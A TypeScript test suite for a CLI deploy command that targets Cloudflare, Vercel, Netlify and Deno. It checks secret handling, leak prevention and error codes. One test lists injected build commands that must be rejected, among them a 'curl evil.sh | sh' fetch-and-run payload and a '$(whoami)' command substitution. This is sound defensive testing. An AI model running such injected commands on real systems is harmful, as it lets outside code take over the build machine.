import { execFileSync } from "node:child_process"
import { existsSync } from "node:fs"
import { readFile, writeFile } from "node:fs/promises"
import { join } from "node:path"

import { describe, expect, it } from "vitest"

import { buildOutput, builtProject, consoleLink, expectNoLeak, fakeHosts, HASH, PENDING_ID } from "./setup-deploy-helpers.ts"
import { createProject, runSetup } from "./setup-helpers.ts"

import type { ViteHubCliSpawn } from "@vite-hub/internal/cli"
import type { SetupDeployOutput, SetupError, SetupMissing } from "../src/setup/index.ts"

type DeployJson = SetupDeployOutput & { error?: SetupError, missing?: SetupMissing[], rerun?: string }

const cloudflareEnv = { CLOUDFLARE_ACCOUNT_ID: "acc-1", CLOUDFLARE_API_TOKEN: "cf-token-1" }
const vercelEnv = { VERCEL_TEAM_ID: "team_1", VERCEL_TOKEN: "vercel-token-1" }
const netlifyEnv = { NETLIFY_AUTH_TOKEN: "netlify-token-1" }
const denoEnv = { DENO_DEPLOY_ORG: "acme", DENO_DEPLOY_TOKEN: "deno-token-1" }
const tokens = ["cf-token-1", "vercel-token-1", "netlify-token-1", "deno-token-1"]

function deploy(args: string[], root: string, env: NodeJS.ProcessEnv, options: { fetch?: typeof fetch, spawn?: ViteHubCliSpawn } = {}) {
  return runSetup<DeployJson>(["deploy", ...args, "--json"], root, env, options)
}

async function readLink(root: string): Promise<Record<string, unknown>> {
  return JSON.parse(await readFile(join(root, ".vitehub/link.json"), "utf8")) as Record<string, unknown>
}

const linkUrl = (origin: string) => `https://console.vitehub.dev/link#p=${PENDING_ID}&url=${encodeURIComponent(origin)}`

describe("vitehub deploy on Cloudflare", () => {
  it("puts the Console hash over stdin, checks it, then runs the deploy that the build wrote", async () => {
    const root = await builtProject("cloudflare", consoleLink())
    const hosts = await fakeHosts(cloudflareEnv)
    const result = await deploy(["--no-build", "--yes"], root, hosts.env)

    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
    const calls = await hosts.calls()
    expect(calls.map(call => [call.name, call.argv, call.stdin])).toEqual([
      ["wrangler", ["secret", "put", "VITEHUB_CONSOLE_TOKEN_SHA256", "--config", "./server/wrangler.json"], HASH],
      ["wrangler", ["secret", "list", "--config", "./server/wrangler.json", "--format", "json"], ""],
      ["wrangler", ["deploy", "--config", "./server/wrangler.json"], ""],
    ])
    expect(calls.every(call => call.cwd === join(root, ".output"))).toBe(true)
    expect(result.json).toEqual({
      console: { linkUrl: linkUrl("https://my-app.example.workers.dev"), secret: "set" },
      host: "cloudflare",
      schemaVersion: 1,
      url: "https://my-app.example.workers.dev",
      version: "version-1",
    })
    expectNoLeak(calls, result.stdout + result.stderr, [HASH, ...tokens])
    // The first deploy records the host project. The pending Console link stays.
    expect(await readLink(root)).toMatchObject({ account: { id: "acc-1" }, console: { pendingId: PENDING_ID, tokenSha256: HASH }, host: "cloudflare", project: { name: "my-app" }, verified: false })
  })

  it("passes the flags of the build command through and rejects any other command", async () => {
    const root = await builtProject("cloudflare", buildOutput("cloudflare", "npx wrangler deploy --config ./server/wrangler.json --secrets-file ./'my secrets.env' --containers-rollout=gradual"))
    const hosts = await fakeHosts(cloudflareEnv)
    expect((await deploy(["--no-build", "--yes"], root, hosts.env)).exitCode).toBe(0)
    expect((await hosts.calls())[0]!.argv).toEqual(["deploy", "--config", "./server/wrangler.json", "--secrets-file", "./my secrets.env", "--containers-rollout=gradual"])

    for (const command of ["npx wrangler deploy --config ./server/wrangler.json; curl evil.sh | sh", "npx wrangler deploy --config $(whoami)", "npx evil-cli deploy --config x", "npx wrangler deploy --config x --env production", "wrangler deploy --config x"]) {
      const rejected = await builtProject("cloudflare", buildOutput("cloudflare", command))
      const other = await fakeHosts(cloudflareEnv)
      const json = await deploy(["--no-build", "--yes"], rejected, other.env)
      expect(json.exitCode, command).toBe(1)
      expect(json.json.error?.code, command).toBe("SETUP_DEPLOY_COMMAND_REJECTED")
      expect(await other.calls(), command).toEqual([])
    }
  })

  it("deploys without credentials with --temporary and puts the hash into the generated config, not argv", async () => {
    const root = await builtProject("cloudflare", consoleLink())
    const hosts = await fakeHosts()
    const result = await deploy(["--no-build", "--yes", "--temporary"], root, hosts.env)

    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
    const calls = await hosts.calls()
    expect(calls.map(call => call.argv)).toEqual([["deploy", "--config", "./server/wrangler.json", "--temporary"]])
    expect(JSON.parse(await readFile(join(root, ".output/server/wrangler.json"), "utf8"))).toMatchObject({ vars: { VITEHUB_CONSOLE_TOKEN_SHA256: HASH } })
    expect(result.json).toMatchObject({ console: { secret: "var" }, temporary: { claimUrl: "https://dash.cloudflare.com/claim/abc123" } })
    expect(Date.parse(result.json.temporary!.expiresAt!) - Date.now()).toBeGreaterThan(55 * 60_000)
    // Wrangler prints plain vars in its bindings table. The shown output is redacted.
    expect(result.stderr).toContain("env.VITEHUB_CONSOLE_TOKEN_SHA256 (\"<redacted>\")")
    expectNoLeak(calls, result.stdout + result.stderr)
    // A temporary Worker belongs to a temporary account, so the link file keeps no host link.
    expect(await readLink(root)).toEqual({ console: { pendingId: PENDING_ID, tokenSha256: HASH }, schemaVersion: 1 })

    const text = await runSetup(["deploy", "--no-build", "--yes", "--temporary"], root, (await fakeHosts()).env)
    expect(text.stdout).toContain("Claim it within 60 minutes")
    expect(text.stdout).toContain("https://dash.cloudflare.com/claim/abc123")
  })

  it("exits 2 without credentials and offers --temporary", async () => {
    const root = await builtProject("cloudflare")
    const hosts = await fakeHosts()
    const result = await deploy(["--no-build", "--yes"], root, hosts.env)

    expect(result.exitCode).toBe(2)
    expect(result.json.error?.code).toBe("SETUP_DEPLOY_CREDENTIALS_MISSING")
    expect(result.json.error?.fix).toContain("vitehub deploy --no-build --temporary --yes --json")
    expect(result.json.error?.fix).toContain("60 minutes")
    expect(result.json.missing).toEqual([{ field: "CLOUDFLARE_API_TOKEN" }])
    expect(result.json.rerun).toBe("vitehub deploy --no-build --temporary --yes --json")
    expect(await hosts.calls()).toEqual([])
  })

  it("refuses --temporary with credentials, because Wrangler refuses it with a login", async () => {
    const result = await deploy(["--no-build", "--yes", "--temporary"], await builtProject("cloudflare"), (await fakeHosts(cloudflareEnv)).env)
    expect(result.exitCode).toBe(3)
    expect(result.json.error?.code).toBe("SETUP_DEPLOY_TEMPORARY_UNSUPPORTED")
  })

  it("exits 1 and does not deploy when the host does not list the secret", async () => {
    const root = await builtProject("cloudflare", consoleLink())
    const hosts = await fakeHosts({ ...cloudflareEnv, FAKE_HOST_FAIL: "wrangler secret list" })
    const result = await deploy(["--no-build", "--yes"], root, hosts.env)

    expect(result.exitCode).toBe(1)
    expect(result.json.error?.code).toBe("SETUP_DEPLOY_SECRET_UNVERIFIED")
    expect((await hosts.calls()).map(call => call.argv[0])).toEqual(["secret", "secret"])
    expectNoLeak(await hosts.calls(), result.stdout + result.stderr)
  })

  it("reports a failed secret put without the value", async () => {
    const root = await builtProject("cloudflare", consoleLink())
    const hosts = await fakeHosts({ ...cloudflareEnv, FAKE_HOST_FAIL: "wrangler secret put" })
    const result = await runSetup(["deploy", "--no-build", "--yes"], root, hosts.env)
    expect(result.exitCode).toBe(1)
    expect(result.stderr).toContain("wrangler secret put VITEHUB_CONSOLE_TOKEN_SHA256")
    expectNoLeak(await hosts.calls(), result.stdout + result.stderr)
  })

  it("uploads a preview version with --preview", async () => {
    const root = await builtProject("cloudflare", buildOutput("cloudflare", "npx wrangler deploy --config ./server/wrangler.json --containers-rollout=gradual"))
    const hosts = await fakeHosts(cloudflareEnv)
    const result = await deploy(["--no-build", "--yes", "--preview"], root, hosts.env)
    expect(result.exitCode, result.stderr).toBe(0)
    expect((await hosts.calls())[0]!.argv).toEqual(["versions", "upload", "--config", "./server/wrangler.json"])
    expect(result.json.url).toBe("https://v1-my-app.example.workers.dev")
  })

  it("marks the deploy with the git commit", async () => {
    const root = await builtProject("cloudflare")
    const git = (...args: string[]) => execFileSync("git", args, { cwd: root, env: { GIT_AUTHOR_EMAIL: "t@example.com", GIT_AUTHOR_NAME: "t", GIT_COMMITTER_EMAIL: "t@example.com", GIT_COMMITTER_NAME: "t", LC_ALL: "C", PATH: "/usr/bin:/bin" } }).toString().trim()
    git("init", "-q")
    git("add", ".")
    git("commit", "-q", "-m", "init")
    const sha = git("rev-parse", "HEAD")
    const hosts = await fakeHosts(cloudflareEnv)

    const clean = await deploy(["--no-build", "--yes"], root, hosts.env)
    expect(clean.exitCode, clean.stderr).toBe(0)
    expect(clean.json.commit).toEqual({ dirty: false, sha })
    expect((await hosts.calls())[0]!.argv).toEqual(["deploy", "--config", "./server/wrangler.json", "--tag", sha.slice(0, 12), "--message", `vitehub:{"commit":"${sha}","dirty":false}`])

    await writeFile(join(root, "changed.txt"), "x")
    const dirty = await deploy(["--no-build", "--yes"], root, hosts.env)
    expect(dirty.json.commit).toEqual({ dirty: true, sha })
  })

  it("has no commit marker outside git", async () => {
    const hosts = await fakeHosts(cloudflareEnv)
    const result = await deploy(["--no-build", "--yes"], await builtProject("cloudflare"), hosts.env)
    expect(result.json.commit).toBeUndefined()
    expect((await hosts.calls())[0]!.argv).not.toContain("--tag")
  })
})

describe("vitehub deploy on Vercel", () => {
  it("creates the project with a first deploy, adds the secret over stdin, then deploys again", async () => {
    const root = await builtProject("vercel", consoleLink())
    const hosts = await fakeHosts(vercelEnv)
    const result = await deploy(["--no-build", "--yes"], root, hosts.env)

    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
    const project = ["--project", "my-app", "--scope", "team_1"]
    const deployArgs = ["deploy", "--prebuilt", "--yes", "--json", "--prod", ...project, "--create-if-missing"]
    expect((await hosts.calls()).map(call => [call.argv, call.stdin])).toEqual([
      [deployArgs, ""],
      [["env", "add", "VITEHUB_CONSOLE_TOKEN_SHA256", "--environment", "production", "--sensitive", "--force", "--yes", ...project], HASH],
      [["env", "ls", "--environment", "production", "--json", ...project], ""],
      [deployArgs, ""],
    ])
    expect(result.json).toEqual({
      console: { linkUrl: linkUrl("https://my-app.vercel.app"), secret: "set" },
      deploymentId: "dpl_2",
      host: "vercel",
      schemaVersion: 1,
      url: "https://my-app.vercel.app",
    })
    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, [HASH, ...tokens])
  })

  it("adds the secret before the only deploy when the link is verified, and marks the commit with --meta", async () => {
    const root = await builtProject("vercel", {
      ".vitehub/link.json": JSON.stringify({ account: { id: "team_1" }, console: { pendingId: PENDING_ID, tokenSha256: HASH }, host: "vercel", linkedAt: "", project: { id: "prj_1", name: "shop" }, schemaVersion: 1, verified: true }),
    })
    const sha = "0123456789abcdef0123456789abcdef01234567"
    const hosts = await fakeHosts({ VERCEL_TOKEN: "vercel-token-1" })
    // A fake git on PATH answers for the repository.
    await writeFile(join(hosts.env.PATH!.split(":")[0]!, "git"), `#!/bin/sh\n[ "$1" = rev-parse ] && echo ${sha}\nexit 0\n`, { mode: 0o755 })
    const result = await deploy(["--no-build", "--yes"], root, hosts.env)

    expect(result.exitCode, result.stderr).toBe(0)
    const calls = await hosts.calls()
    expect(calls.map(call => call.argv.slice(0, 2))).toEqual([["env", "add"], ["env", "ls"], ["deploy", "--prebuilt"]])
    expect(calls[2]!.argv).toEqual(["deploy", "--prebuilt", "--yes", "--json", "--prod", "--project", "shop", "--scope", "team_1", "--create-if-missing", "--meta", `vitehubCommit=${sha}`, "--meta", "vitehubDirty=false"])
  })

  it("deploys with --temporary and puts the hash into the function config, not argv", async () => {
    const root = await builtProject("vercel", consoleLink())
    const hosts = await fakeHosts()
    const result = await deploy(["--no-build", "--yes", "--temporary"], root, hosts.env)

    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
    expect((await hosts.calls()).map(call => call.argv)).toEqual([["deploy", "--prebuilt", "--yes", "--json", "--prod", "--temporary"]])
    expect(JSON.parse(await readFile(join(root, ".vercel/output/functions/__server.func/.vc-config.json"), "utf8"))).toMatchObject({ environment: { VITEHUB_CONSOLE_TOKEN_SHA256: HASH } })
    expect(result.json).toMatchObject({ console: { secret: "var" }, temporary: { claimUrl: "https://vercel.com/claim/xyz", expiresAt: "2026-11-07T00:00:00.000Z" } })
    // The anonymous token in .vercel/anonymous.json stays there.
    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, [HASH, "anonymous-token"])
  })

  it("refuses --temporary in a linked folder and in CI", async () => {
    const linked = await builtProject("vercel", { ".vercel/project.json": "{}" })
    expect((await deploy(["--no-build", "--yes", "--temporary"], linked, (await fakeHosts()).env)).json.error?.code).toBe("SETUP_DEPLOY_TEMPORARY_UNSUPPORTED")
    const ci = await deploy(["--no-build", "--yes", "--temporary"], await builtProject("vercel"), (await fakeHosts({ CI: "1" })).env)
    expect(ci.exitCode).toBe(3)
  })

  it("exits 2 without credentials and offers --temporary", async () => {
    const result = await deploy(["--no-build", "--yes"], await builtProject("vercel"), (await fakeHosts()).env)
    expect(result.exitCode).toBe(2)
    expect(result.json.missing).toEqual([{ field: "VERCEL_TOKEN" }])
    expect(result.json.rerun).toBe("vitehub deploy --no-build --temporary --yes --json")
  })
})

interface NetlifyRequest {
  method: string
  url: string
  body: unknown
}

function netlifyApi(): { fetch: typeof fetch, requests: NetlifyRequest[] } {
  const requests: NetlifyRequest[] = []
  let variable: unknown
  const fakeFetch = async (input: string | URL | Request, init?: RequestInit): Promise<Response> => {
    const url = new URL(String(input))
    const method = init?.method ?? "GET"
    const body: unknown = init?.body ? JSON.parse(String(init.body)) : undefined
    requests.push({ body, method, url: url.href })
    const json = (value: unknown, status = 200) => new Response(JSON.stringify(value), { headers: { "content-type": "application/json" }, status })
    if (method === "GET" && url.pathname === "/api/v1/sites/site-1") return json({ account_id: "acct-1", id: "site-1", name: "my-app" })
    if (url.pathname === "/api/v1/accounts/acct-1/env/VITEHUB_CONSOLE_TOKEN_SHA256" && method === "GET") return variable ? json(variable) : json({ message: "Not Found" }, 404)
    if (url.pathname === "/api/v1/accounts/acct-1/env" && method === "POST" && Array.isArray(body)) {
      variable = { ...body[0], values: [] }
      return json(body, 201)
    }
    throw new Error(`unexpected request ${method} ${url.href}`)
  }
  return { fetch: fakeFetch, requests }
}

describe("vitehub deploy on Netlify", () => {
  it("deploys, sets the secret in a JSON request body, and deploys again to the site", async () => {
    const root = await builtProject("netlify", consoleLink())
    const hosts = await fakeHosts(netlifyEnv)
    const api = netlifyApi()
    const result = await deploy(["--no-build", "--yes"], root, hosts.env, { fetch: api.fetch })

    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
    expect((await hosts.calls()).map(call => call.argv)).toEqual([
      ["deploy", "--no-build", "--dir", "dist", "--json", "--prod", "--site-name", "my-app"],
      ["deploy", "--no-build", "--dir", "dist", "--json", "--prod", "--site", "site-1"],
    ])
    expect(api.requests.map(request => `${request.method} ${request.url}`)).toEqual([
      "GET https://api.netlify.com/api/v1/sites/site-1",
      "GET https://api.netlify.com/api/v1/accounts/acct-1/env/VITEHUB_CONSOLE_TOKEN_SHA256?site_id=site-1",
      "POST https://api.netlify.com/api/v1/accounts/acct-1/env?site_id=site-1",
      "GET https://api.netlify.com/api/v1/accounts/acct-1/env/VITEHUB_CONSOLE_TOKEN_SHA256?site_id=site-1",
    ])
    expect(api.requests[2]!.body).toEqual([{ is_secret: true, key: "VITEHUB_CONSOLE_TOKEN_SHA256", scopes: ["functions"], values: [{ context: "production", value: HASH }, { context: "deploy-preview", value: HASH }] }])
    for (const request of api.requests) expect(request.url).not.toContain(HASH)
    expect(result.json).toEqual({ console: { linkUrl: linkUrl("https://my-app.netlify.app"), secret: "set" }, deploymentId: "deploy-2", host: "netlify", schemaVersion: 1, url: "https://my-app.netlify.app" })
    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, [HASH, ...tokens])
    expect(await readLink(root)).toMatchObject({ account: { id: "acct-1" }, host: "netlify", project: { id: "site-1", name: "my-app" }, verified: false })
  })

  it("has no temporary deploy", async () => {
    const result = await deploy(["--no-build", "--yes", "--temporary"], await builtProject("netlify"), (await fakeHosts()).env)
    expect(result.exitCode).toBe(3)
    expect(result.json.error?.code).toBe("SETUP_DEPLOY_TEMPORARY_UNSUPPORTED")
  })

  it("exits 2 without credentials and offers no --temporary", async () => {
    const result = await deploy(["--no-build", "--yes"], await builtProject("netlify"), (await fakeHosts()).env)
    expect(result.exitCode).toBe(2)
    expect(result.json.rerun).toBeUndefined()
    expect(result.json.error?.fix).not.toContain("--temporary")
  })
})

describe("vitehub deploy on Deno", () => {
  it("creates the app, loads the secret from /dev/stdin, then deploys again", async () => {
    const root = await builtProject("deno", consoleLink())
    const hosts = await fakeHosts(denoEnv)
    const result = await deploy(["--no-build", "--yes"], root, hosts.env)

    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
    const app = ["--json", "--non-interactive", "--org", "acme", "--app", "my-app"]
    expect((await hosts.calls()).map(call => [call.argv, call.stdin])).toEqual([
      [["deploy", "env", "list", ...app], ""],
      [["deploy", "create", ".", "--source", "local", "--allow-node-modules", "--org", "acme", "--app", "my-app"], ""],
      [["deploy", "env", "load", "/dev/stdin", "--replace", ...app], `VITEHUB_CONSOLE_TOKEN_SHA256=${HASH}\n`],
      [["deploy", "env", "list", ...app], ""],
      [["deploy", "create", ".", "--source", "local", "--allow-node-modules", "--org", "acme", "--app", "my-app"], ""],
      [["deploy", ".", "--prod", "--config", "deno.json", "--allow-node-modules", "--org", "acme", "--app", "my-app"], ""],
    ])
    expect(result.json).toEqual({ console: { linkUrl: linkUrl("https://my-app.acme.deno.net"), secret: "set" }, host: "deno", schemaVersion: 1, url: "https://my-app.acme.deno.net" })
    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, [HASH, ...tokens])
  })

  it("needs the organization, and has no --preview or --temporary", async () => {
    const root = await builtProject("deno")
    const noOrg = await deploy(["--no-build", "--yes"], root, (await fakeHosts({ DENO_DEPLOY_TOKEN: "deno-token-1" })).env)
    expect(noOrg.exitCode).toBe(2)
    expect(noOrg.json.missing).toEqual([{ field: "DENO_DEPLOY_ORG" }])
    expect((await deploy(["--no-build", "--yes", "--preview"], root, (await fakeHosts(denoEnv)).env)).json.error?.code).toBe("SETUP_DEPLOY_PREVIEW_UNSUPPORTED")
    expect((await deploy(["--no-build", "--yes", "--temporary"], root, (await fakeHosts()).env)).exitCode).toBe(3)
  })
})

describe("vitehub deploy", () => {
  it("exits 2 with a rerun without a terminal and without --yes", async () => {
    const hosts = await fakeHosts(cloudflareEnv)
    const result = await deploy(["--no-build"], await builtProject("cloudflare"), hosts.env)
    expect(result.exitCode).toBe(2)
    expect(result.json.rerun).toBe("vitehub deploy --no-build --yes --json")
    expect(await hosts.calls()).toEqual([])
  })

  it("runs the build script with the package manager, unless --no-build", async () => {
    const root = await builtProject("cloudflare")
    const hosts = await fakeHosts(cloudflareEnv)
    const spawned: string[][] = []
    const spawn: ViteHubCliSpawn = async (command, args, options) => {
      spawned.push([command, ...args, options?.cwd ?? ""])
      return { exitCode: 0 }
    }
    expect((await deploy(["--yes"], root, hosts.env, { spawn })).exitCode).toBe(0)
    expect(spawned).toEqual([["pnpm", "run", "build", root]])

    const failing: ViteHubCliSpawn = async () => ({ exitCode: 2 })
    const failed = await deploy(["--yes"], root, hosts.env, { spawn: failing })
    expect(failed.exitCode).toBe(1)
    expect(failed.json.error?.code).toBe("SETUP_DEPLOY_BUILD_FAILED")
  })

  it("needs a build script and a build output for the host", async () => {
    const noScript = await builtProject("cloudflare", { "package.json": JSON.stringify({ name: "my-app" }) })
    expect((await deploy(["--yes"], noScript, (await fakeHosts(cloudflareEnv)).env)).json.error?.code).toBe("SETUP_DEPLOY_BUILD_FAILED")

    const unbuilt = await createProject({ "package.json": JSON.stringify({ name: "my-app" }), "vite.config.ts": "import { vitehub } from \"vite-hub\"\nexport default { plugins: [vitehub({ preset: \"cloudflare\" })] }\n" })
    expect((await deploy(["--no-build", "--yes"], unbuilt, (await fakeHosts(cloudflareEnv)).env)).json.error?.code).toBe("SETUP_DEPLOY_OUTPUT_MISSING")

    const mismatch = await builtProject("cloudflare", { ".output/deployment.json": JSON.stringify({ preset: "node" }) })
    const result = await deploy(["--no-build", "--yes"], mismatch, (await fakeHosts(cloudflareEnv)).env)
    expect(result.exitCode).toBe(3)
    expect(result.json.error?.code).toBe("SETUP_DEPLOY_HOST_MISMATCH")
  })

  it("has no upload for a Node server", async () => {
    const root = await createProject({ "package.json": JSON.stringify({ name: "my-app" }), "vite.config.ts": "import { vitehub } from \"vite-hub\"\nexport default { plugins: [vitehub()] }\n" })
    const result = await deploy(["--no-build", "--yes"], root, {})
    expect(result.exitCode).toBe(3)
    expect(result.json.error?.code).toBe("SETUP_DEPLOY_HOST_UNSUPPORTED")
  })

  it("deploys without a Console link and prints the URL", async () => {
    const root = await builtProject("cloudflare")
    const result = await runSetup(["deploy", "--no-build", "--yes"], root, (await fakeHosts(cloudflareEnv)).env)
    expect(result.exitCode, result.stderr).toBe(0)
    expect(result.stdout).toBe("Deployed my-app to cloudflare: https://my-app.example.workers.dev\nVersion: version-1\n")
    expect(existsSync(join(root, ".vitehub/link.json"))).toBe(true)
  })
})
